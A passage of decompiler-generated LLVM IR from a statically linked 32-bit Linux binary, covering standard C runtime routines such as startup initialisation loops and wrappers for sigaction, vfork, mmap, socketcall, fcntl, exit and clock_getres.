  %v14_804f365 = icmp eq i32 %v1_804f35d, %v3_804f365
  %v1_804f367 = icmp eq i1 %v14_804f365, false
  br i1 %v1_804f367, label %dec_label_pc_804f36f, label %dec_label_pc_804f369

dec_label_pc_804f369:                             ; preds = %dec_label_pc_804f323
  store i32 %v3_804f35a, i32* @global_var_805874c.172, align 4
  br label %dec_label_pc_804f36f

dec_label_pc_804f36f:                             ; preds = %dec_label_pc_804f323, %dec_label_pc_804f369
  store i32 0, i32* %stack_var_-168, align 4
  %v2_804f374 = ptrtoint i32* %stack_var_-136 to i32
  %v3_804f379 = bitcast i32* %stack_var_-136 to i8*
  %v4_804f379 = call i32 @function_804d178(i8* %v3_804f379, i32 0, i32 120)
  %v0_804f37e = load i32, i32* @global_var_805874c.172, align 4
  br label %dec_label_pc_804f386

dec_label_pc_804f386:                             ; preds = %dec_label_pc_804f386, %dec_label_pc_804f36f
  %v0_804f386 = phi i32 [ %v1_804f389, %dec_label_pc_804f386 ], [ %v0_804f37e, %dec_label_pc_804f36f ]
  %v1_804f386 = inttoptr i32 %v0_804f386 to i32*
  %v2_804f386 = load i32, i32* %v1_804f386, align 4
  %v3_804f386 = icmp eq i32 %v2_804f386, 0
  %v1_804f389 = add i32 %v0_804f386, 4
  %v1_804f38c = icmp eq i1 %v3_804f386, false
  br i1 %v1_804f38c, label %dec_label_pc_804f386, label %dec_label_pc_804f3ad.preheader

dec_label_pc_804f3ad.preheader:                   ; preds = %dec_label_pc_804f386
  store i32 %v1_804f389, i32* @ebx, align 4
  %v1_804f3ad1 = inttoptr i32 %v1_804f389 to i32*
  %v2_804f3ad2 = load i32, i32* %v1_804f3ad1, align 4
  %v3_804f3ad3 = icmp eq i32 %v2_804f3ad2, 0
  %v1_804f3b010 = icmp eq i1 %v3_804f3ad3, false
  br i1 %v1_804f3b010, label %dec_label_pc_804f392.lr.ph, label %dec_label_pc_804f3b2

dec_label_pc_804f392.lr.ph:                       ; preds = %dec_label_pc_804f3ad.preheader
  %v3_804f372 = ptrtoint i32* %stack_var_-168 to i32
  %v3_804f39d = add i32 %v3_804f372, 32
  br label %dec_label_pc_804f392

dec_label_pc_804f392:                             ; preds = %dec_label_pc_804f392.lr.ph, %dec_label_pc_804f3aa
  %v1_804f39d = phi i32 [ %v2_804f3ad2, %dec_label_pc_804f392.lr.ph ], [ %v2_804f3ad, %dec_label_pc_804f3aa ]
  %v0_804f39c = phi i32 [ %v1_804f389, %dec_label_pc_804f392.lr.ph ], [ %v1_804f3aa, %dec_label_pc_804f3aa ]
  %v6_804f397 = icmp ugt i32 %v1_804f39d, 14
  br i1 %v6_804f397, label %dec_label_pc_804f3aa, label %dec_label_pc_804f399

dec_label_pc_804f399:                             ; preds = %dec_label_pc_804f392
  store i32 %v0_804f39c, i32* %stack_var_-168, align 4
  %v2_804f39d = mul i32 %v1_804f39d, 8
  %v4_804f39d = add i32 %v3_804f39d, %v2_804f39d
  %v3_804f3a2 = inttoptr i32 %v4_804f39d to i16*
  %v4_804f3a2 = call i32 @function_804d150(i16* %v3_804f3a2, i32 %v0_804f39c, i32 8)
  %v0_804f3aa.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f3aa

dec_label_pc_804f3aa:                             ; preds = %dec_label_pc_804f392, %dec_label_pc_804f399
  %v0_804f3aa = phi i32 [ %v0_804f39c, %dec_label_pc_804f392 ], [ %v0_804f3aa.pre, %dec_label_pc_804f399 ]
  %v1_804f3aa = add i32 %v0_804f3aa, 8
  store i32 %v1_804f3aa, i32* @ebx, align 4
  %v1_804f3ad = inttoptr i32 %v1_804f3aa to i32*
  %v2_804f3ad = load i32, i32* %v1_804f3ad, align 4
  %v3_804f3ad = icmp eq i32 %v2_804f3ad, 0
  %v1_804f3b0 = icmp eq i1 %v3_804f3ad, false
  br i1 %v1_804f3b0, label %dec_label_pc_804f392, label %dec_label_pc_804f3b2

dec_label_pc_804f3b2:                             ; preds = %dec_label_pc_804f3aa, %dec_label_pc_804f3ad.preheader
  store i32 %v2_804f374, i32* @eax, align 4
  %v0_804f3b6 = call i32 @function_80512d4()
  store i32 %v0_804f3b6, i32* @eax, align 4
  %v0_804f3bb = call i32 @function_804f2e3()
  %v1_804f3c4 = icmp eq i32 %tmp26, 0
  %v1_804f3c6 = icmp eq i1 %v1_804f3c4, false
  br i1 %v1_804f3c6, label %dec_label_pc_804f3cc, label %dec_label_pc_804f3c8

dec_label_pc_804f3c8:                             ; preds = %dec_label_pc_804f3b2
  %v1_804f3c8 = and i32 %tmp26, -65536
  %v2_804f3c8 = or i32 %v1_804f3c8, 4096
  br label %dec_label_pc_804f3cc

dec_label_pc_804f3cc:                             ; preds = %dec_label_pc_804f3b2, %dec_label_pc_804f3c8
  %v0_804f3cc = phi i32 [ %tmp26, %dec_label_pc_804f3b2 ], [ %v2_804f3c8, %dec_label_pc_804f3c8 ]
  store i32 %v0_804f3cc, i32* @global_var_8058750.102, align 16
  %v13_804f3d1 = icmp eq i32 %tmp25, -1
  %v1_804f3d6 = icmp eq i1 %v13_804f3d1, false
  br i1 %v1_804f3d6, label %dec_label_pc_804f401, label %dec_label_pc_804f3d8

dec_label_pc_804f3d8:                             ; preds = %dec_label_pc_804f3cc
  %v0_804f3d8 = call i32 @function_804f89c()
  store i32 %v0_804f3d8, i32* @ebx, align 4
  %v0_804f3df = call i32 @function_804f818()
  %v0_804f3e4 = load i32, i32* @ebx, align 4
  %v12_804f3e4 = icmp eq i32 %v0_804f3e4, %v0_804f3df
  %v1_804f3e6 = icmp eq i1 %v12_804f3e4, false
  br i1 %v1_804f3e6, label %dec_label_pc_804f417, label %dec_label_pc_804f3e8

dec_label_pc_804f3e8:                             ; preds = %dec_label_pc_804f3d8
  %v0_804f3e8 = call i32 @function_804f840()
  store i32 %v0_804f3e8, i32* @ebx, align 4
  %v0_804f3ef = call i32 @function_804f7f0()
  %v0_804f3f4 = load i32, i32* @ebx, align 4
  %v12_804f3f4 = icmp eq i32 %v0_804f3f4, %v0_804f3ef
  %v1_804f3f6 = icmp eq i1 %v12_804f3f4, false
  br i1 %v1_804f3f6, label %dec_label_pc_804f417, label %dec_label_pc_804f3f8.thread

dec_label_pc_804f3f8.thread:                      ; preds = %dec_label_pc_804f3e8
  br label %dec_label_pc_804f441

dec_label_pc_804f401:                             ; preds = %dec_label_pc_804f3cc
  %v15_804f401 = icmp eq i32 %tmp25, %tmp24
  %v1_804f405 = icmp eq i1 %v15_804f401, false
  br i1 %v1_804f405, label %dec_label_pc_804f417, label %dec_label_pc_804f407

dec_label_pc_804f407:                             ; preds = %dec_label_pc_804f401
  br label %dec_label_pc_804f417

dec_label_pc_804f417:                             ; preds = %dec_label_pc_804f407, %dec_label_pc_804f401, %dec_label_pc_804f3e8, %dec_label_pc_804f3d8
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804f41e = call i32 @function_804f2af()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804f42d = call i32 @function_804f2af()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804f43c = call i32 @function_804f2af()
  br label %dec_label_pc_804f441

dec_label_pc_804f441:                             ; preds = %dec_label_pc_804f3f8.thread, %dec_label_pc_804f417
  store i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32* %esi.global-to-local, align 4
  %v0_804f446 = load i32, i32* @edi, align 4
  %v1_804f446 = inttoptr i32 %v0_804f446 to i32*
  %v2_804f446 = load i32, i32* %v1_804f446, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32* %esi.global-to-local, align 4
  store i32 %v2_804f446, i32* inttoptr (i32 134570104 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8058754.176, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569189), i32 6), label %dec_label_pc_804f466, label %dec_label_pc_804f472

dec_label_pc_804f466:                             ; preds = %dec_label_pc_804f441, %dec_label_pc_804f466
  %v4_804f46649 = phi i32 [ %v1_804f46d, %dec_label_pc_804f466 ], [ 0, %dec_label_pc_804f441 ]
  %v5_804f466 = mul i32 %v4_804f46649, 4
  %v6_804f466 = add i32 %v5_804f466, ptrtoint (i32* @global_var_8055ce8.174 to i32)
  %v7_804f466 = inttoptr i32 %v6_804f466 to i32*
  %v8_804f466 = load i32, i32* %v7_804f466, align 4
  call void @__pseudo_call(i32 %v8_804f466)
  %v0_804f46d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f46d = add i32 %v0_804f46d, 1
  store i32 %v1_804f46d, i32* %ebx.global-to-local, align 4
  %v1_804f46e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804f46e = icmp ult i32 %v1_804f46d, %v1_804f46e.pre
  br i1 %v7_804f46e, label %dec_label_pc_804f466, label %dec_label_pc_804f472

dec_label_pc_804f472:                             ; preds = %dec_label_pc_804f466, %dec_label_pc_804f441
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32 2), i32 0), label %dec_label_pc_804f48a, label %dec_label_pc_804f496

dec_label_pc_804f48a:                             ; preds = %dec_label_pc_804f472, %dec_label_pc_804f48a
  %v4_804f48a46 = phi i32 [ %v1_804f491, %dec_label_pc_804f48a ], [ 0, %dec_label_pc_804f472 ]
  store i32 ptrtoint (i32* @global_var_804f491.183 to i32), i32* %stack_var_-168, align 4
  %v5_804f48a = mul i32 %v4_804f48a46, 4
  %v6_804f48a = add i32 %v5_804f48a, ptrtoint (i32* @global_var_8055ce8.174 to i32)
  %v7_804f48a = inttoptr i32 %v6_804f48a to i32*
  %v8_804f48a = load i32, i32* %v7_804f48a, align 4
  call void @__pseudo_call(i32 %v8_804f48a)
  %v0_804f491 = load i32, i32* @ebx, align 4
  %v1_804f491 = add i32 %v0_804f491, 1
  store i32 %v1_804f491, i32* @ebx, align 4
  %v1_804f492.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804f492 = icmp ult i32 %v1_804f491, %v1_804f492.pre
  br i1 %v7_804f492, label %dec_label_pc_804f48a, label %dec_label_pc_804f496

dec_label_pc_804f496:                             ; preds = %dec_label_pc_804f48a, %dec_label_pc_804f472
  %v0_804f49f = load i32, i32* %stack_var_-168, align 4
  %v1_804f49f = call i32 @function_804b774(i32 %v0_804f49f)
  %v1_804f4a4 = inttoptr i32 %v1_804f49f to i32*
  store i32 0, i32* %v1_804f4a4, align 4
  %v0_804f4b3 = call i32 @function_804fae4()
  store i32 %v0_804f4b3, i32* @eax, align 4
  %v1_804f4b8 = inttoptr i32 %v0_804f4b3 to i32*
  store i32 0, i32* %v1_804f4b8, align 4
  %v0_804f4be = load i32, i32* @eax, align 4
  store i32 %v0_804f4be, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_804f324)
  %v0_804f4d4 = load i32, i32* @eax, align 4
  %v1_804f4d7 = call i32 @function_804eec4(i32 %v0_804f4d4)
  %v0_804f4e1 = load i32, i32* @ebx, align 4
  %v1_804f4e1 = inttoptr i32 %v0_804f4e1 to %sigcontext*
  %v2_804f4e1 = call i32 @sigreturn(%sigcontext* %v1_804f4e1)
  %v0_804f4e9 = load i32, i32* @ebx, align 4
  %v1_804f4e9 = inttoptr i32 %v0_804f4e9 to %sigcontext*
  %v2_804f4e9 = call i32 @sigreturn(%sigcontext* %v1_804f4e9)
  ret i32 %v2_804f4e9

; uselistorder directives
  uselistorder i32 %v1_804f491, { 1, 2, 0 }
  uselistorder i32 %v1_804f46d, { 1, 2, 0 }
  uselistorder i32 %v2_804f3ad, { 1, 0 }
  uselistorder i32 %v1_804f3aa, { 2, 1, 0 }
  uselistorder i32 %v1_804f389, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f386, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @function_804eec4, { 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8055ce8.174 to i32), i32 -134569192), { 0, 2, 1 }
  uselistorder i32 ()* @function_804f2af, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 10, 11, 4, 9, 7, 8, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804f48a, { 1, 0 }
  uselistorder label %dec_label_pc_804f466, { 1, 0 }
  uselistorder label %dec_label_pc_804f441, { 1, 0 }
  uselistorder label %dec_label_pc_804f3cc, { 1, 0 }
  uselistorder label %dec_label_pc_804f3aa, { 1, 0 }
  uselistorder label %dec_label_pc_804f392, { 1, 0 }
  uselistorder label %dec_label_pc_804f36f, { 1, 0 }
}

define i32 @function_804f4eb(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f4eb:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804f4eb = load i32, i32* @esi, align 4
  %v0_804f4ec = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804f501 = icmp eq i32* %arg2, null
  br i1 %v1_804f501, label %dec_label_pc_804f554, label %dec_label_pc_804f505

dec_label_pc_804f505:                             ; preds = %dec_label_pc_804f4eb
  %v2_804f505 = load i32, i32* %arg2, align 4
  store i32 %v2_804f505, i32* %stack_var_-148, align 4
  %v1_804f50e = add i32 %tmp11, 4
  %v3_804f520 = bitcast i32* %stack_var_-136 to i16*
  %v4_804f520 = call i32 @function_804d150(i16* %v3_804f520, i32 %v1_804f50e, i32 128)
  %v1_804f525 = add i32 %tmp11, 132
  %v2_804f53f = inttoptr i32 %v1_804f525 to i8*
  %v3_804f53f = load i8, i8* %v2_804f53f, align 1
  %v4_804f53f = and i8 %v3_804f53f, 4
  %v5_804f53f = icmp eq i8 %v4_804f53f, 0
  %v1_804f546 = icmp eq i1 %v5_804f53f, false
  br i1 %v1_804f546, label %dec_label_pc_804f554, label %dec_label_pc_804f548

dec_label_pc_804f548:                             ; preds = %dec_label_pc_804f505
  br label %dec_label_pc_804f554

dec_label_pc_804f554:                             ; preds = %dec_label_pc_804f548, %dec_label_pc_804f505, %dec_label_pc_804f4eb
  %v1_804f556 = icmp eq i32 %arg3, 0
  br i1 %v1_804f556, label %dec_label_pc_804f55e, label %dec_label_pc_804f55a

dec_label_pc_804f55a:                             ; preds = %dec_label_pc_804f554
  %v2_804f55a = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804f55e

dec_label_pc_804f55e:                             ; preds = %dec_label_pc_804f554, %dec_label_pc_804f55a
  %v0_804f56d = phi i32 [ 0, %dec_label_pc_804f554 ], [ %v2_804f55a, %dec_label_pc_804f55a ]
  br i1 %v1_804f501, label %dec_label_pc_804f56b, label %dec_label_pc_804f564

dec_label_pc_804f564:                             ; preds = %dec_label_pc_804f55e
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804f56b

dec_label_pc_804f56b:                             ; preds = %dec_label_pc_804f55e, %dec_label_pc_804f564
  %v0_804f56e = phi %sigaction* [ null, %dec_label_pc_804f55e ], [ %phitmp, %dec_label_pc_804f564 ]
  %v5_804f576 = call i32 @function_804f6c4(i32 %arg1, %sigaction* %v0_804f56e, i32 %v0_804f56d, i32 8)
  store i32 %v5_804f576, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f556, label %dec_label_pc_804f5b9, label %dec_label_pc_804f584

dec_label_pc_804f584:                             ; preds = %dec_label_pc_804f56b
  %v2_804f584 = icmp slt i32 %v5_804f576, 0
  br i1 %v2_804f584, label %dec_label_pc_804f5b9, label %dec_label_pc_804f588

dec_label_pc_804f588:                             ; preds = %dec_label_pc_804f584
  %v3_804f588 = load i32, i32* %stack_var_-288, align 4
  %v2_804f58c = inttoptr i32 %arg3 to i32*
  store i32 %v3_804f588, i32* %v2_804f58c, align 4
  %v2_804f594 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804f599 = add i32 %arg3, 4
  %v3_804f59d = inttoptr i32 %v1_804f599 to i16*
  %v4_804f59d = call i32 @function_804d150(i16* %v3_804f59d, i32 %v2_804f594, i32 128)
  %v2_804f5a6 = add i32 %arg3, 132
  %v3_804f5a6 = inttoptr i32 %v2_804f5a6 to i32*
  %v2_804f5b3 = add i32 %arg3, 136
  %v3_804f5b3 = inttoptr i32 %v2_804f5b3 to i32*
  %v0_804f5b9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f5b9

dec_label_pc_804f5b9:                             ; preds = %dec_label_pc_804f584, %dec_label_pc_804f56b, %dec_label_pc_804f588
  %v0_804f5b9 = phi i32 [ %v5_804f576, %dec_label_pc_804f584 ], [ %v5_804f576, %dec_label_pc_804f56b ], [ %v0_804f5b9.pre, %dec_label_pc_804f588 ]
  store i32 %v0_804f4ec, i32* @ebx, align 4
  store i32 %v0_804f4eb, i32* @esi, align 4
  ret i32 %v0_804f5b9

; uselistorder directives
  uselistorder i32 %v5_804f576, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804f556, { 1, 0 }
  uselistorder i1 %v1_804f501, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804f5b9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f56b, { 1, 0 }
  uselistorder label %dec_label_pc_804f55e, { 1, 0 }
}

define i32 @function_804f5c4() local_unnamed_addr {
dec_label_pc_804f5c4:
  %v0_804f5ca = call i32 @vfork()
  %v5_804f5cd = icmp ult i32 %v0_804f5ca, -4095
  %v1_804f5d2 = icmp eq i1 %v5_804f5cd, false
  call void @__pseudo_cond_branch(i1 %v1_804f5d2, i32 134550304)
  ret i32 %v0_804f5ca
}

define i32 @function_804f5dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804f5dc:
  %stack_var_4 = alloca i32, align 4
  %v0_804f5dc = load i32, i32* @ebx, align 4
  store i32 %v0_804f5dc, i32* @edx, align 4
  %v2_804f5e7 = load i32, i32* @ecx, align 4
  %v4_804f5e7 = load i32, i32* @esi, align 4
  %v5_804f5e7 = load i32, i32* @edi, align 4
  %v6_804f5e7 = load i32, i32* @ebp, align 4
  %v7_804f5e7 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_804f5e7, i32 %v0_804f5dc, i32 %v4_804f5e7, i32 %v5_804f5e7, i32 %v6_804f5e7)
  %v8_804f5e7 = ptrtoint i32* %v7_804f5e7 to i32
  store i32 %v0_804f5dc, i32* @ebx, align 4
  %v3_804f5f0 = icmp ugt i32* %v7_804f5e7, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_804f5f0, i32 134550304)
  ret i32 %v8_804f5e7

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134550304, { 1, 0 }
}

define i32 @function_804f5f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f5f8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f5f8 = load i32, i32* @ebx, align 4
  store i32 %v0_804f5f8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804f60b = call i32 @int80_syscall(i32 102)
  store i32 %v1_804f60b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804f60b, -4095
  br i1 %tmp8, label %dec_label_pc_804f624, label %dec_label_pc_804f618

dec_label_pc_804f618:                             ; preds = %dec_label_pc_804f5f8
  %v0_804f618 = load i32, i32* %stack_var_-4, align 4
  %v1_804f618 = call i32 @function_804b774(i32 %v0_804f618)
  %v0_804f61d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f61d = sub i32 0, %v0_804f61d
  %v2_804f61f = inttoptr i32 %v1_804f618 to i32*
  store i32 %v1_804f61d, i32* %v2_804f61f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f624

dec_label_pc_804f624:                             ; preds = %dec_label_pc_804f5f8, %dec_label_pc_804f618
  %v0_804f624 = phi i32 [ %v1_804f60b, %dec_label_pc_804f5f8 ], [ -1, %dec_label_pc_804f618 ]
  %v2_804f626 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f626, i32* @edx, align 4
  %v2_804f628 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f628, i32* @ebx, align 4
  ret i32 %v0_804f624

; uselistorder directives
  uselistorder i32 %v1_804f60b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f624, { 1, 0 }
}

define i32 @function_804f62c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f62c:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f62c = load i32, i32* @edi, align 4
  %v0_804f62d = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804f641 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804f64b = icmp ugt i32 %v1_804f641, 2
  br i1 %v6_804f64b, label %dec_label_pc_804f65b, label %dec_label_pc_804f64d

dec_label_pc_804f64d:                             ; preds = %dec_label_pc_804f62c
  %v4_804f651 = call i32 @function_804f684(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804f641)
  br label %dec_label_pc_804f67d

dec_label_pc_804f65b:                             ; preds = %dec_label_pc_804f62c
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804f663 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804f663, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804f663, -4095
  br i1 %tmp17, label %dec_label_pc_804f67b, label %dec_label_pc_804f66f

dec_label_pc_804f66f:                             ; preds = %dec_label_pc_804f65b
  %v1_804f66f = call i32 @function_804b774(i32 %v0_804f62d)
  %v0_804f674 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f674 = sub i32 0, %v0_804f674
  %v2_804f676 = inttoptr i32 %v1_804f66f to i32*
  store i32 %v1_804f674, i32* %v2_804f676, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f67b

dec_label_pc_804f67b:                             ; preds = %dec_label_pc_804f65b, %dec_label_pc_804f66f
  %v0_804f67b = phi i32 [ %v2_804f663, %dec_label_pc_804f65b ], [ -1, %dec_label_pc_804f66f ]
  br label %dec_label_pc_804f67d

dec_label_pc_804f67d:                             ; preds = %dec_label_pc_804f64d, %dec_label_pc_804f67b
  %v0_804f682 = phi i32 [ %v4_804f651, %dec_label_pc_804f64d ], [ %v0_804f67b, %dec_label_pc_804f67b ]
  store i32 %v0_804f62d, i32* @ebx, align 4
  store i32 %v0_804f62c, i32* @edi, align 4
  ret i32 %v0_804f682

; uselistorder directives
  uselistorder i32 %v2_804f663, { 1, 0, 2 }
  uselistorder i32 %v0_804f62d, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804f67d, { 1, 0 }
  uselistorder label %dec_label_pc_804f67b, { 1, 0 }
}

define i32 @function_804f684(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f684:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f684 = load i32, i32* @edi, align 4
  store i32 %v0_804f684, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804f69c = load i32, i32* @ebx, align 4
  %v1_804f6a4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804f6a4, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804f6a4, -4095
  br i1 %tmp11, label %dec_label_pc_804f6bc, label %dec_label_pc_804f6b0

dec_label_pc_804f6b0:                             ; preds = %dec_label_pc_804f684
  %v1_804f6b0 = call i32 @function_804b774(i32 %v0_804f69c)
  %v0_804f6b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f6b5 = sub i32 0, %v0_804f6b5
  %v2_804f6b7 = inttoptr i32 %v1_804f6b0 to i32*
  store i32 %v1_804f6b5, i32* %v2_804f6b7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f6bc

dec_label_pc_804f6bc:                             ; preds = %dec_label_pc_804f684, %dec_label_pc_804f6b0
  %v0_804f6bc = phi i32 [ %v1_804f6a4, %dec_label_pc_804f684 ], [ -1, %dec_label_pc_804f6b0 ]
  %v2_804f6c1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f6c1, i32* %edi.global-to-local, align 4
  ret i32 %v0_804f6bc

; uselistorder directives
  uselistorder i32 %v1_804f6a4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f6bc, { 1, 0 }
}

define i32 @function_804f6c4(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f6c4:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804f6c5 = load i32, i32* @esi, align 4
  store i32 %v0_804f6c5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804f6d9 = load i32, i32* @ebx, align 4
  %v7_804f6e1 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804f6e1, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804f6e1, -4095
  br i1 %tmp13, label %dec_label_pc_804f6f9, label %dec_label_pc_804f6ed

dec_label_pc_804f6ed:                             ; preds = %dec_label_pc_804f6c4
  %v1_804f6ed = call i32 @function_804b774(i32 %v0_804f6d9)
  %v0_804f6f2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f6f2 = sub i32 0, %v0_804f6f2
  %v2_804f6f4 = inttoptr i32 %v1_804f6ed to i32*
  store i32 %v1_804f6f2, i32* %v2_804f6f4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f6f9

dec_label_pc_804f6f9:                             ; preds = %dec_label_pc_804f6c4, %dec_label_pc_804f6ed
  %v0_804f6f9 = phi i32 [ %v7_804f6e1, %dec_label_pc_804f6c4 ], [ -1, %dec_label_pc_804f6ed ]
  %v2_804f6fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f6fc, i32* @esi, align 4
  ret i32 %v0_804f6f9

; uselistorder directives
  uselistorder i32 %v7_804f6e1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f6f9, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_804f700(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_804f700:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_804f728(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f728:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f728 = load i32, i32* @ebx, align 4
  store i32 %v0_804f728, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804f73b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804f73b, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_804f73b, -4095
  br i1 %tmp9, label %dec_label_pc_804f754, label %dec_label_pc_804f748

dec_label_pc_804f748:                             ; preds = %dec_label_pc_804f728
  %v0_804f748 = load i32, i32* %stack_var_-4, align 4
  %v1_804f748 = call i32 @function_804b774(i32 %v0_804f748)
  %v0_804f74d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f74d = sub i32 0, %v0_804f74d
  %v2_804f74f = inttoptr i32 %v1_804f748 to i32*
  store i32 %v1_804f74d, i32* %v2_804f74f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f754

